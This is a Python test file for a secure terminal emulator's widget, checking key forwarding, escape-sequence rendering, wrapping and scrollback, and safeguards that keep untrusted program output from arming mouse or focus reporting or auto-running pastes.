#!/usr/bin/python3 -Bsu

## Copyright (C) 2026 - 2026 ENCRYPTED SUPPORT LLC <adrelanos@whonix.org>
## See the file COPYING for copying conditions.

## AI-Assisted

"""Offscreen widget tests, half 1: line-mode + TUI render, colours, paste/copy review.

Half of the offscreen widget/window tests; the shared harness (helpers, imports,
APP, pass/fail counters, fmt_of_char, glyph_pt) lives in test_widget_common. Run as
its own process; the coverage gate runs the two halves concurrently and unions it.
"""

from test_widget_common import *   # noqa: F401,F403  (shared harness)


# --- line-mode key forwarding -------------------------------------------------
t = SecureTerminal(command='/bin/cat')
sent = spy_writes(t)
key(t, Qt.Key.Key_A, 'a')
key(t, Qt.Key.Key_Return)
key(t, Qt.Key.Key_Backspace)
key(t, Qt.Key.Key_Tab)
eq(sent, [b'a', b'\r', b'\x7f', b'\t'], 'line keys forwarded')
sent.clear()
key(t, Qt.Key.Key_D, '', Qt.KeyboardModifier.ControlModifier)   # Ctrl+D EOF
key(t, Qt.Key.Key_L, '', Qt.KeyboardModifier.ControlModifier)   # Ctrl+L clear
eq(sent, [b'\x04', b'\x0c'], 'ctrl D/L are bytes')
sent.clear()
# Ctrl+<letter> sends its control byte, like a real terminal: cooked mode turns
# 0x03 into SIGINT, a raw-mode app reads the byte itself (readline Ctrl+A/R, an
# app's own "press Ctrl+C again to exit"). Ctrl+backslash -> 0x1c (SIGQUIT).
key(t, Qt.Key.Key_C, '', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_A, '', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_R, '', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_Backslash, '', Qt.KeyboardModifier.ControlModifier)
eq(sent, [b'\x03', b'\x01', b'\x12', b'\x1c'], 'ctrl+key sends its control byte')
# Ctrl+Alt is Meta: a real terminal (xterm metaSendsEscape) prefixes the control
# byte with ESC, so an UNBOUND Ctrl+Alt+<key> reaches the child as ESC+byte, not a
# bare control byte with Alt silently dropped.
sent.clear()
_ctrl_alt = Qt.KeyboardModifier.ControlModifier | Qt.KeyboardModifier.AltModifier
key(t, Qt.Key.Key_C, '', _ctrl_alt)
key(t, Qt.Key.Key_U, '', _ctrl_alt)
key(t, Qt.Key.Key_Backslash, '', _ctrl_alt)
eq(sent, [b'\x1b\x03', b'\x1b\x15', b'\x1b\x1c'],
   'ctrl+alt+key is Meta: ESC prefixes the control byte (CLI)')
# Same Meta rule on the TUI path (_tui_key), matching its printable Alt+<char>
# branch that already ESC-prefixes: plain Ctrl+C stays a bare byte, Ctrl+Alt+C = ESC+byte.
_metatui = SecureTerminal(command='/bin/cat', tui=True)
_metasent = spy_writes(_metatui)
key(_metatui, Qt.Key.Key_C, '', Qt.KeyboardModifier.ControlModifier)
key(_metatui, Qt.Key.Key_C, '', _ctrl_alt)
eq(_metasent, [b'\x03', b'\x1b\x03'],
   'ctrl+alt+key is Meta: ESC prefixes the control byte (TUI)')
# the rest of the Ctrl+@..Ctrl+_ range: forward the control byte Qt computed
# (Ctrl+] -> 0x1d, Ctrl+/ -> 0x1f readline-undo, Ctrl+[ -> 0x1b ESC)
sent.clear()
key(t, Qt.Key.Key_BracketRight, '\x1d', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_Slash, '\x1f', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_BracketLeft, '\x1b', Qt.KeyboardModifier.ControlModifier)
eq(sent, [b'\x1d', b'\x1f', b'\x1b'], 'ctrl+punctuation forwards its control byte')
# a whitespace control (Ctrl+Return carries \r) is NOT swallowed by that
# fallback -- it still submits via the Return path
sent.clear()
key(t, Qt.Key.Key_Return, '\r', Qt.KeyboardModifier.ControlModifier)
eq(sent, [b'\r'], 'ctrl+return still submits the line, not swallowed as a control byte')
# printable non-ASCII is a deliberate keystroke -> sent UTF-8 (euro, e-acute)
sent.clear()
key(t, Qt.Key.Key_unknown, chr(0x20AC))       # euro sign
key(t, Qt.Key.Key_unknown, chr(0x00E9))       # e-acute
eq(sent, [chr(0x20AC).encode('utf-8'), chr(0x00E9).encode('utf-8')],
   'printable unicode input sent as utf-8')
# a non-printable keystroke (bidi override) is still dropped
sent.clear()
key(t, Qt.Key.Key_unknown, chr(0x202E))       # RLO bidi override
eq(sent, [], 'non-printable (bidi) input dropped')

# --- _append: backspace erase, CRLF, overwrite, line-local --------------------
a = SecureTerminal(command='/bin/cat')
a._append('abc')
a._append('\x08 \x08')                 # readline erase
eq(a.toPlainText().rstrip(), 'ab', 'backspace erase')
b = SecureTerminal(command='/bin/cat')
b._append('l1\r\nl2\r\n')
eq(b.toPlainText(), 'l1\nl2\n', 'CRLF collapsed')
c = SecureTerminal(command='/bin/cat')
c._append('123456')
c._append('\rAB')
eq(c.toPlainText(), 'AB3456', 'bare CR overwrite')
d = SecureTerminal(command='/bin/cat')
d._append('first\nsecond')
d._append('\rX')
eq(d.toPlainText(), 'first\nXecond', 'CR line-local')
# multi-backspace: five readline erases delete five chars (persistent cursor)
mb = SecureTerminal(command='/bin/cat')
mb._append('fffff')
for _ in range(5):
    mb._append('\x08 \x08')
eq(mb.toPlainText().rstrip(), '', 'five backspaces erase five chars')

# Real interactive-zsh redraw streams captured under TERM=secure-terminal with
# zsh-autosuggestions + syntax-highlighting. These MUST resolve to the plain text,
# never the append-garble ("llslsls" / "eexport ...") -- the redraws use backspace,
# per-keystroke SGR, AND CSI cursor moves (\x1b[<n>D / \x1b[<n>C), all of which the
# line renderer must honor as overwrites.
zl = SecureTerminal(command='/bin/cat')     # typing "ls" (per-keystroke echo)
zl._append('l\x08l\x1b[90ms\x1b[39m\x08\x08ls\x08\x08\x1b[36ml\x1b[36ms\x1b[39m')
eq(zl.toPlainText().rstrip(), 'ls',
   'zsh per-keystroke redraw of "ls" resolves to "ls", not the append-garble')
zc = SecureTerminal(command='/bin/cat')     # CSI cursor-back overwrite
zc._append('abc\x1b[2DXY')
eq(zc.toPlainText().rstrip(), 'aXY',
   'CSI cursor-back (\\x1b[2D) overwrites in place, not appends')
zr = SecureTerminal(command='/bin/cat')     # burst re-export echo (CSI-back redraw)
zr._append('export TERM=secure-terminal\x1b[27D'
           '\x1b[33me\x1b[33mx\x1b[33mp\x1b[33mo\x1b[33mr\x1b[33mt\x1b[39m\x1b[1C'
           '\x1b[37mT\x1b[37mE\x1b[37mR\x1b[37mM\x1b[37m=\x1b[37ms\x1b[37me\x1b[37mc'
           '\x1b[37mu\x1b[37mr\x1b[37me\x1b[37m-\x1b[37mt\x1b[37me\x1b[37mr\x1b[37mm'
           '\x1b[37mi\x1b[37mn\x1b[37ma\x1b[37ml\x1b[39m')
eq(zr.toPlainText().rstrip(), 'export TERM=secure-terminal',
   'burst re-export echo resolves cleanly, not "eexport ..."')
# BEL is cursor-neutral (rings the bell, writes no cell, moves no column) -- like
# every real terminal. Treating it as a cell shifted the cursor one column off on
# any line-editor redraw that beeps (a completion menu emits BEL), so a following
# backspace+reprint duplicated a character: the garbled tab-completion (#87).
zbel = SecureTerminal(command='/bin/cat')
zbel._append('abc\x07def')
eq(zbel.toPlainText().rstrip(), 'abcdef',
   'a BEL is consumed: no cell and no cursor movement')
zbel2 = SecureTerminal(command='/bin/cat')
zbel2._append('ls a\x07\x08a')          # typed text, completion beep, redraw
eq(zbel2.toPlainText().rstrip(), 'ls a',
   'a BEL before a backspace+reprint does not duplicate a char (#87)')

# The neutralized-byte placeholder is DISPLAYED as a box (U+25A1) for readability,
# but every text export (copy / save / toPlainText) maps it back to ASCII '_', so
# a copied or saved transcript stays pure ASCII. Box mode only.
boxt = SecureTerminal(command='/bin/cat')
boxt._mode = 'box'
## C7: Use the correct unicode literal for ZWSP mojibake input
feed_output(boxt, 'caf\u00e9\u200b\n'.encode('utf-8'))   # e-acute + zero-width
ok('\u25a1' in boxt.document().toPlainText(),
   'box display shows the box for a neutralized byte')
ok('\u25a1' not in boxt.toPlainText() and '_' in boxt.toPlainText(),
   'export (toPlainText) maps the box back to ASCII _')
data = boxt.createMimeDataFromSelection
boxt.selectAll()
ok('\u25a1' not in boxt.createMimeDataFromSelection().text(),
   'copy maps the box back to ASCII _')
# Show mode is the opt-in to copy real unicode, so it does NOT collapse to ASCII:
# a printable glyph is copied as itself, while a no-glyph character (shown as a
# box) copies as that box -- never as the raw invisible/bidi byte, which is the
# hazard. So the dangerous character still never reaches the clipboard.
sht = SecureTerminal(command='/bin/cat')
sht._mode = 'show'
# real UTF-8 for e-acute (U+00E9) + a zero-width space (U+200B); build the code
# points then encode, so the bytes are genuine UTF-8, not double-encoded.
feed_output(sht, 'caf\u00e9\u200b\n'.encode('utf-8'))
_sh_export = sht.toPlainText()
ok('\u00e9' in _sh_export, 'show mode copies a real printable glyph as itself (e-acute kept)')
ok('\u25a1' in _sh_export and '\u200b' not in _sh_export,
   'show mode copies a no-glyph char as the box, never the raw zero-width byte')

# --- horizontal scroll: a terminal WRAPS to the width, never hides content off-screen ---
# A real terminal has no horizontal scroll. Detail/Reveal expand each cell to a wide
# <U+XXXX> badge, so the DISPLAY wraps to the viewport (WidgetWidth); Box/Show cells are
# ~1 column and stay NoWrap so a glyph keeps its line/column across a box<->show toggle;
# the TUI grid is sized to fit and never wraps. Regression: Detail was NoWrap, so a long
# line overflowed the width and the auto-follow (ensureCursorVisible) scrolled the viewport
# to the caret's column, parking it mid-line and hiding the start of every row.
from PyQt6.QtWidgets import QPlainTextEdit as _QPTE                # noqa: E402
_WW = _QPTE.LineWrapMode.WidgetWidth
_NW = _QPTE.LineWrapMode.NoWrap
_wm = SecureTerminal(command='/bin/cat')
eq(_wm.lineWrapMode(), _WW, 'CLI Detail (default) wraps the display to the width')
_wm.apply_mode('reveal')
eq(_wm.lineWrapMode(), _WW, 'CLI Reveal wraps the display to the width')
_wm.apply_mode('box')
eq(_wm.lineWrapMode(), _NW, 'CLI Box does not wrap (glyph line/column stable across box<->show)')
_wm.apply_mode('show')
eq(_wm.lineWrapMode(), _NW, 'CLI Show does not wrap (glyph line/column stable across box<->show)')
_wm.close()
_wmt = SecureTerminal(command='/bin/cat', tui=True)
eq(_wmt.lineWrapMode(), _NW,
   'TUI grid never wraps (sized to fit; Detail/Reveal cells fall back to the box)')
_wmt.close()

# #8: narrowing the terminal REFLOWS retained Box-mode line output to the new width (an
# old long line re-wraps instead of horizontal-scrolling); Box stays NoWrap. _rerender is
# the reflow mechanism (replays _raw through _feed_line, which hard-wraps at self._cols);
# resizeEvent schedules it debounced on a column-count change.
from PyQt6.QtGui import QResizeEvent as _QRE   # noqa: E402
_t8 = SecureTerminal(command='/bin/cat')
_t8.apply_mode('box')
_t8._cols = 100
_t8._raw = 'x' * 300
_t8._rerender()                                # reflow at cols=100
_wide8 = _t8.blockCount()
_t8._cols = 40
_t8._rerender()                                # reflow at the narrower width
ok(_t8.blockCount() > _wide8,
   '#8: narrowing reflows Box output to more (shorter) wrapped rows, not one wide row')
eq(_t8.lineWrapMode(), _NW, '#8: Box stays NoWrap (design invariant preserved)')
# resizeEvent schedules the debounced reflow when the column count changes.
_t8._reflow_timer.stop()
_t8._cols = 99999                              # force a mismatch vs the real grid width
_t8.resizeEvent(_QRE(_t8.size(), _t8.size()))
ok(_t8._reflow_timer.isActive(),
   '#8: a resize that changes the column count schedules the debounced line reflow')
_t8._reflow_timer.stop()
# #4 (ai-review): the debounced width-reflow (_reflow, the timer slot) replays the FULL
# retained _raw, not just the _RERENDER_TAIL, so a resize never DELETES older scrollback.
_t8._cols = 100
_t8._raw = 'SCROLLBACK-SENTINEL\n' + ('z' * (_t8._RERENDER_TAIL + 5000))
_t8._reflow()
ok('SCROLLBACK-SENTINEL' in _t8.toPlainText(),
   '#4: a width reflow replays the full _raw -- beyond-tail scrollback survives a resize')
_t8._rerender()                                # the default (mode-toggle) path keeps the tail
ok('SCROLLBACK-SENTINEL' not in _t8.toPlainText(),
   '#4: a plain _rerender still tail-caps (the intentional hot-toggle budget)')
_t8.close()

# Horizontal scrollbar policy tracks the display mode: a TUI grid is a fixed
# viewport-wide canvas (a real terminal never shows a horizontal bar on one), so
# it is AlwaysOff; CLI keeps AsNeeded so a genuinely long NoWrap Box/Show line
# stays reachable by a real scroll. Policy-only, so font-independent.
from PyQt6.QtCore import Qt as _Qt                                 # noqa: E402
_OFF = _Qt.ScrollBarPolicy.ScrollBarAlwaysOff
_ASN = _Qt.ScrollBarPolicy.ScrollBarAsNeeded
_sb = SecureTerminal(command='/bin/cat')                          # CLI
eq(_sb.horizontalScrollBarPolicy(), _ASN,
   'CLI mode keeps the horizontal scrollbar AsNeeded')
_sb.apply_tui(True)
eq(_sb.horizontalScrollBarPolicy(), _OFF,
   'TUI grid suppresses the horizontal scrollbar (AlwaysOff)')
_sb.apply_tui(False)
eq(_sb.horizontalScrollBarPolicy(), _ASN,
   'switching TUI->CLI restores the AsNeeded horizontal scrollbar')
_sb.close()
_sbt = SecureTerminal(command='/bin/cat', tui=True)
eq(_sbt.horizontalScrollBarPolicy(), _OFF,
   'a tab created in TUI mode starts with the horizontal scrollbar suppressed')
_sbt.close()

# Click-padding: a local press/drag must keep the horizontal scrollbar homed to the
# left, so the base QPlainTextEdit press does not scroll the left document margin
# off-screen for the press duration (all lines jumping left until release). Font-robust
# overflow per the skill: _cols=0 disables autowrap, then a long ASCII run overflows by
# char count in every font.
from PyQt6.QtGui import QMouseEvent as _QME                        # noqa: E402
from PyQt6.QtCore import QPointF as _QPF                           # noqa: E402
_hp = SecureTerminal(command='/bin/cat')                          # CLI, AsNeeded hbar
_hp.setLineWrapMode(_NW)
_hp.resize(200, 100)
_hp.show()
APP.processEvents()
_hp._cols = 0
_hp._append('M' * 800)
APP.processEvents()
_hpb = _hp.horizontalScrollBar()
ok(_hpb.maximum() > _hpb.minimum(), 'the long NoWrap line gives the hbar a real range')
_pos = _QPF(20, 10)
_press = _QME(QEvent.Type.MouseButtonPress, _pos, _pos, _Qt.MouseButton.LeftButton,
              _Qt.MouseButton.LeftButton, _Qt.KeyboardModifier.NoModifier)
_hpb.setValue(_hpb.maximum())          # pretend the base handler scrolled the view right
_hp.mousePressEvent(_press)
eq(_hpb.value(), _hpb.minimum(),
   'a local left-press re-homes the hbar (the left margin stays pinned)')
_hpb.setValue(_hpb.maximum())
_mpos = _QPF(30, 10)
_move = _QME(QEvent.Type.MouseMove, _mpos, _mpos, _Qt.MouseButton.NoButton,
             _Qt.MouseButton.LeftButton, _Qt.KeyboardModifier.NoModifier)
_hp.mouseMoveEvent(_move)              # _mouse_selecting was set by the press above
eq(_hpb.value(), _hpb.minimum(),
   'a local drag-move keeps the hbar homed through the drag')
_hp.close()

# restart_as_shell (TUI): an exited -- PROGRAM tab must KEEP its primary-screen output as
# scrollback (only the transient alt frame is dropped, as on rmcup), not clear the grid to
# just the handover banner. Regression: the TUI branch made a FRESH screen, wiping the
# exited program's colour-log / cat-file output. Uses a TUI /bin/cat tab whose output never
# enters the alternate screen.
_rk = SecureTerminal(command='/bin/cat', tui=True)
APP.processEvents()
_rk._feed_stream(b'PRIMARY-OUTPUT-KEEPME\r\n')
_rk._render_tui()
APP.processEvents()
ok('PRIMARY-OUTPUT-KEEPME' in _rk.toPlainText(),
   'the TUI program primary output is on screen before the restart')
# SECURITY: the exited program enabled bracketed paste (DEC 2004). Because keep_screen
# REUSES the pyte screen, that stale bit must be cleared on restart -- else a later
# non-bracketed multiline paste would read as bracketed, skip the mandatory staging, and
# AUTO-RUN. (Regression: the reused screen kept the program's DEC modes.)
from secure_terminal.terminal import _BRACKETED_PASTE_MODE as _BPM   # noqa: E402
_rk._screen.mode.add(_BPM)
_rk_restarted = _rk.restart_as_shell()
# Snapshot the stale-bit clear SYNCHRONOUSLY, before processEvents: restart clears the
# EXITED program's ?2004h (the security property), but the freshly-spawned shell's
# readline legitimately re-arms DEC 2004 at its first prompt within a few seconds, so
# asserting after processEvents races that correct re-arm (CI flake).
_bpm_cleared = _BPM not in _rk._screen.mode
APP.processEvents()
ok(_rk_restarted, 'restart_as_shell restarts a -- PROGRAM tab (returns True)')
ok('PRIMARY-OUTPUT-KEEPME' in _rk.toPlainText(),
   'restart_as_shell keeps the exited TUI program primary output as scrollback')
ok('program exited' in _rk.toPlainText(),
   'and seeds the handover banner below the kept output')
# REGRESSION: _raw must ALSO carry the banner, not just the grid. _feed_stream feeds only
# the pyte grid (self._stream), so reseeding _raw from _grid_text() WITHOUT the banner left
# _raw holding the exited program's output with NO separator -- a later CLI<->TUI switch
# replays _raw and rebuilds scrollback with no handover marker, so the new shell's prompt
# reads as the exited program's output. (canary: old code set _raw = _grid_text() only.)
ok('PRIMARY-OUTPUT-KEEPME' in _rk._raw and 'program exited' in _rk._raw,
   'restart seeds the handover banner into _raw too (a later CLI replay keeps the separator)')
ok(_bpm_cleared,
   'restart clears a stale bracketed-paste (DEC 2004) bit from the reused screen')
_rk.close()

# restart_as_shell (alt-screen ACTIVE at exit): a program still on its ALTERNATE screen
# (a pager/editor that never rmcup'd) must have that transient frame dropped -- _alt_leave,
# exactly like rmcup -- so the restart lands on the primary screen with the output that
# preceded the alt frame, not on the abandoned full-screen frame.
_ra = SecureTerminal(command='/bin/cat', tui=True)
APP.processEvents()
feed_output(_ra, b'PRIMARY-BEFORE-ALT\r\n')  # full read path so the alt-scan runs
_ra._render_tui()
feed_output(_ra, b'\x1b[?1049h')             # enter the alternate screen and stay there
_ra._render_tui()
APP.processEvents()
ok(_ra._alt_screen, 'the program is on the alternate screen before the restart')
ok(_ra.restart_as_shell(), 'restart_as_shell restarts an alt-screen -- PROGRAM tab')
APP.processEvents()
ok(not _ra._alt_screen,
   'restart drops the abandoned alternate frame (_alt_leave, like rmcup)')
ok('PRIMARY-BEFORE-ALT' in _ra.toPlainText(),
   'and the primary-screen output that preceded the alt frame survives the restart')
_ra.close()

# #6 (ai-review): the keep_screen restart must RESET the pyte charset, else a program
# that designated G0 = DEC special-graphics (ESC ( 0) leaves it set and the new shell's
# ASCII 'q' renders as a box-drawing horizontal line, not the letter.
_cs = SecureTerminal(command='/bin/cat', tui=True)
APP.processEvents()
feed_output(_cs, b'\x1b(0')                     # designate G0 = DEC special graphics
_cs._render_tui()
ok(_cs.restart_as_shell(), '#6: restart a -- PROGRAM tab that left G0 = graphics')
APP.processEvents()
feed_output(_cs, b'qqq')                        # 'q' under DEC graphics is a line glyph
_cs._render_tui()
ok('q' in _cs.toPlainText(),
   '#6: after restart, ASCII renders as ASCII (G0 charset reset, not box-drawing)')
_cs.close()

# #7 (ai-review): after a keep_screen restart _raw is reseeded from the retained grid's
# CLEAN text (not reset to the banner alone), so the exited program's visible scrollback
# survives a later switch to CLI mode instead of vanishing.
_g7 = SecureTerminal(command='/bin/cat', tui=True)
APP.processEvents()
feed_output(_g7, b'GRID-KEEPME line one\r\n')
_g7._render_tui()
ok('GRID-KEEPME' in _g7._grid_text(),
   '#7: _grid_text serializes the retained grid (scrollback + current screen)')
ok(_g7.restart_as_shell(), '#7: restart the TUI -- PROGRAM tab')
APP.processEvents()
ok('GRID-KEEPME' in _g7._raw,
   '#7: after restart _raw carries the exited output (reseeded from the clean grid), '
   'not just the banner -- a later CLI switch reproduces it')
_g7.close()
# cover _grid_text's SCROLLBACK-history branch: feed more lines than the grid height so
# the oldest rows scroll into history.top, then _grid_text must serialize those too.
_g7s = SecureTerminal(command='/bin/cat', tui=True)
APP.processEvents()
for _i in range(_g7s._screen.lines + 5):
    feed_output(_g7s, ('SCROLL-%d\r\n' % _i).encode('utf-8'))
_g7s._render_tui()
ok('SCROLL-0' in _g7s._grid_text(),
   '#7: _grid_text serializes rows scrolled off into history.top (scrollback branch)')
_g7s.close()
# cover the scr-is-None guard: no screen -> empty string, never a crash.
_g7n = SecureTerminal(command='/bin/cat', tui=True)
_g7n._screen = None
ok(_g7n._grid_text() == '', '#7: _grid_text returns empty when there is no screen')
_g7n.close()

# alternate scroll: a full-screen program that did NOT request the mouse (a plain
# pager in the alternate screen) has no local scrollback to move, so the wheel is
# translated to arrow-key line scrolls (xterm's alternateScroll). A program that DID
# request the mouse instead gets full SGR mouse reporting -- see the konsole-parity
# block below. The normal screen keeps the local wheel scroll (nothing to the child).
import re                                                         # noqa: E402
from PyQt6.QtGui import QWheelEvent, QMouseEvent as _QME, QFocusEvent as _QFEv  # noqa: E402
from PyQt6.QtCore import QPoint as _QP, QPointF as _QPF, QEvent  # noqa: E402,F811




_alt = SecureTerminal(command='/bin/cat', tui=True)
_asent = spy_writes(_alt)
_SGR_RE = re.compile(rb'^\x1b\[<(\d+);(\d+);(\d+)([Mm])$')


def _wheel_ev(dy, mods=Qt.KeyboardModifier.NoModifier, dx=0, pos=(5, 5)):
    p = _QPF(pos[0], pos[1])
    return QWheelEvent(p, p, _QP(0, 0), _QP(dx, dy),
                       Qt.MouseButton.NoButton, mods,
                       Qt.ScrollPhase.NoScrollPhase, False)


def _parse_sgr(chunks):
    """(button, col, row, 'M'|'m') of a single SGR mouse report in `chunks`, or None
    -- coordinate-robust across font envs (asserts structure, not exact cells)."""
    m = _SGR_RE.match(b''.join(chunks))
    return (int(m.group(1)), int(m.group(2)), int(m.group(3)),
            m.group(4).decode()) if m else None


def _mev(kind, btn, mods=Qt.KeyboardModifier.NoModifier, buttons=None, pos=(200, 100)):
    p = _QPF(pos[0], pos[1])
    held = buttons if buttons is not None else (
        btn if kind == QEvent.Type.MouseButtonPress else Qt.MouseButton.NoButton)
    return _QME(kind, p, p, btn, held, mods)


_alt._alt_screen = True
_alt.wheelEvent(_wheel_ev(-120))          # wheel DOWN -> arrow-down x3
eq(b''.join(_asent), b'\x1b[B' * 3, 'alt-screen wheel down sends arrow-down to the child')
_asent.clear()
_alt.wheelEvent(_wheel_ev(120))           # wheel UP -> arrow-up x3
eq(b''.join(_asent), b'\x1b[A' * 3, 'alt-screen wheel up sends arrow-up to the child')
_asent.clear()
_alt._alt_screen = False
_alt.wheelEvent(_wheel_ev(-120))          # normal screen -> local scroll, no arrows
eq(_asent, [], 'normal-screen wheel does not send arrows (keeps local scrollback scroll)')
# a high-res trackpad streams tiny deltas: accumulate one line per ~40 units, NOT one
# arrow per micro-event (the hyperscroll a min-1-per-event formula would cause)
_alt._alt_screen = True
_alt._wheel_accum = 0
_asent.clear()
for _ in range(39):
    _alt.wheelEvent(_wheel_ev(-1))
eq(_asent, [], 'trackpad micro-deltas below one line send nothing yet (no hyperscroll)')
_alt.wheelEvent(_wheel_ev(-1))            # the 40th unit crosses one line
eq(b''.join(_asent), b'\x1b[B', 'accumulated micro-deltas emit one line per ~40 units')
# A stale sub-line wheel remainder must NOT survive an alt-screen transition, or
# the first small wheel in the NEXT full-screen app crosses the per-line threshold
# early and emits a spurious arrow. feed_output drives the real transition path.
_alt._wheel_accum = 39
feed_output(_alt, b'\x1b[?1049l')          # leave the alt screen
eq(_alt._wheel_accum, 0, 'alt-screen EXIT drops any stale wheel-scroll remainder')
_alt._wheel_accum = 39
feed_output(_alt, b'\x1b[?1049h')          # re-enter the alt screen
eq(_alt._wheel_accum, 0, 'alt-screen ENTER drops any stale wheel-scroll remainder')

# SECURITY: mouse tracking is an output-armed INPUT channel. In default CLI mode (not
# TUI, no alt screen) untrusted output printing ?1000h?1006h?1004h must NOT let a click,
# wheel or focus change become pty report bytes -- the "output cannot affect input"
# contract. Only a full-screen program actually driving the terminal (TUI mode / alt
# screen) may consume; the SCAN stays mode-agnostic so state persists across a switch.
_mc = SecureTerminal(command=None)
_mc.show()
_mc._cols = 80
_mcsent = spy_writes(_mc)
feed_output(_mc, b'\x1b[?1000h\x1b[?1006h\x1b[?1004h')   # untrusted output arms the bits
ok(not _mc.tui_active() and not _mc._alt_screen, 'the terminal is in default CLI mode')
ok(not _mc._mouse_report_on(),
   'CLI mode: output-armed mouse modes do NOT enable reporting (output cannot affect input)')
_mcsent.clear()
_mc.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton))
ok(_parse_sgr(_mcsent) is None, 'CLI mode: a click emits no SGR mouse report')
_mcsent.clear()
_mc.wheelEvent(_wheel_ev(-120, pos=(200, 100)))
ok(_parse_sgr(_mcsent) is None, 'CLI mode: a wheel emits no SGR mouse report')
_mcsent.clear()
_mc.focusInEvent(_QFEv(QEvent.Type.FocusIn))
ok(b'\x1b[I' not in b''.join(_mcsent), 'CLI mode: a focus change emits no DEC 1004 report')
_mc.apply_tui(True)   # the user opts into TUI: a live full-screen program may now report
ok(_mc._mouse_report_on(),
   'TUI mode: the SAME armed modes now report (CLI-mode blocking was the mode gate)')
_mc.close()

# wheel->arrow alternateScroll (a pager that did NOT request mouse) is the SAME output-armed
# input channel via _alt_screen ALONE: untrusted output printing ?1049h arms it
# mode-agnostically. In default CLI mode a plain wheel must scroll LOCAL scrollback, NOT
# inject arrow keys into the child; only in TUI mode (the user viewing the program) is the
# surrogate intended.
_wa = SecureTerminal(command='/bin/cat')      # CLI mode, no mouse request
_wa.show()
_wasent = spy_writes(_wa)
feed_output(_wa, b'\x1b[?1049h')              # untrusted output arms the alt screen
ok(_wa._alt_screen and not _wa.tui_active(), 'CLI mode with an output-armed alt screen')
_wa._wheel_accum = 0
_wasent.clear()
_wa.wheelEvent(_wheel_ev(-120))
ok(b'\x1b[A' not in b''.join(_wasent) and b'\x1b[B' not in b''.join(_wasent),
   'CLI mode: a wheel over an output-armed alt screen injects NO arrow keys')
_wa.apply_tui(True)                           # the user opts into TUI: viewing the program
_wa._wheel_accum = 0
_wasent.clear()
_wa.wheelEvent(_wheel_ev(-120))
ok(b'\x1b[B' in b''.join(_wasent),
   'TUI mode: the wheel->arrow alternateScroll surrogate fires for a viewed program')
_wa.close()

# SECURITY (residual): an output-armed ALT SCREEN alone (?1049h in CLI mode) must not
# enable the CLICK/BUTTON or FOCUS report channel either -- _alt_screen is set by the
# child's output, so trusting it re-opens the "output cannot affect input" hole that the
# wheel path already closed. Only tui_active() (the user's explicit apply_tui, never
# output-armed) may. FAILS on _mouse_input_allowed() = tui_active() OR _alt_screen.
_ma = SecureTerminal(command='/bin/cat')          # CLI mode, no TUI
_ma.show()
_ma._cols = 80
_masent = spy_writes(_ma)
feed_output(_ma, b'\x1b[?1049h')                  # output arms the alt screen
feed_output(_ma, b'\x1b[?1000h\x1b[?1006h\x1b[?1004h')   # output arms tracking + SGR + focus
ok(_ma._alt_screen and not _ma.tui_active(),
   'CLI mode: an output-armed alt screen with armed mouse modes')
ok(not _ma._mouse_report_on(),
   'output-armed alt screen ALONE does not enable click/button reporting')
_masent.clear()
_ma.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton))
ok(_parse_sgr(_masent) is None,
   'alt-screen-armed CLI: a click emits no SGR mouse report')
_masent.clear()
_ma.focusInEvent(_QFEv(QEvent.Type.FocusIn))
ok(b'\x1b[I' not in b''.join(_masent),
   'alt-screen-armed CLI: a focus change emits no DEC 1004 report')
_ma.apply_tui(True)               # the user opts into TUI: the SAME armed modes may report
ok(_ma._mouse_report_on(),
   'TUI mode: the armed modes report once the user is actually driving a full-screen app')
_ma.close()

# konsole/xterm mouse-reporting parity: once the child requests tracking (1000/
# 1002/1003) + SGR encoding (1006), its mouse and wheel events are REPORTED to it at
# the cell UNDER THE POINTER (not a pinned corner, not arrow keys). Shift is the
# local override throughout. feed_output drives the real DECSET scan that arms this.
_alt.show()
_alt._cols = 80
_alt._alt_screen = True
_alt._wheel_accum = 0
_alt._wheel_accum_x = 0
feed_output(_alt, b'\x1b[?1000h\x1b[?1002h\x1b[?1003h\x1b[?1004h\x1b[?1006h')
ok(_alt._mouse_report_on(), 'tracking + SGR arms mouse reporting')
ok(_alt.hasMouseTracking(), '1003 any-motion turns on widget mouse tracking')

# wheel: vertical 64 up / 65 down, at the pointer cell (real coordinate, NOT 1;1).
_asent.clear()
_alt.wheelEvent(_wheel_ev(-120, pos=(200, 100)))
_wd = _parse_sgr(_asent)
ok(_wd is not None and _wd[0] == 65 and _wd[3] == 'M', 'wheel down -> SGR button 65 press')
ok(_wd[1] > 1 or _wd[2] > 1, 'the wheel report uses the pointer cell, not a pinned 1;1')
_asent.clear()
_alt._wheel_accum = 0
_alt.wheelEvent(_wheel_ev(120, pos=(200, 100)))
ok(_parse_sgr(_asent)[0] == 64, 'wheel up -> SGR button 64')
# horizontal wheel -> 66 left / 67 right (trackpad/tilt parity)
_asent.clear()
_alt._wheel_accum_x = 0
_alt.wheelEvent(_wheel_ev(0, dx=120, pos=(200, 100)))
ok(_parse_sgr(_asent)[0] == 67, 'horizontal wheel right -> SGR button 67')
_asent.clear()
_alt._wheel_accum_x = 0
_alt.wheelEvent(_wheel_ev(0, dx=-120, pos=(200, 100)))
ok(_parse_sgr(_asent)[0] == 66, 'horizontal wheel left -> SGR button 66')
# a huge single delta is CAPPED at 8 reports (no unbounded burst)
_asent.clear()
_alt._wheel_accum = 0
_alt.wheelEvent(_wheel_ev(-120 * 12, pos=(200, 100)))
eq(len(_asent), 8, 'a huge wheel delta is capped at 8 reports')

# buttons: left/middle/right press (0/1/2 'M') + release (same code, 'm')
for _btn, _code in ((Qt.MouseButton.LeftButton, 0),
                    (Qt.MouseButton.MiddleButton, 1),
                    (Qt.MouseButton.RightButton, 2)):
    _asent.clear()
    _alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, _btn))
    _pp = _parse_sgr(_asent)
    ok(_pp[0] == _code and _pp[3] == 'M', 'press button %d -> SGR %d M' % (_code, _code))
    _asent.clear()
    _alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, _btn))
    _pr = _parse_sgr(_asent)
    ok(_pr[0] == _code and _pr[3] == 'm', 'release button %d -> SGR %d m' % (_code, _code))

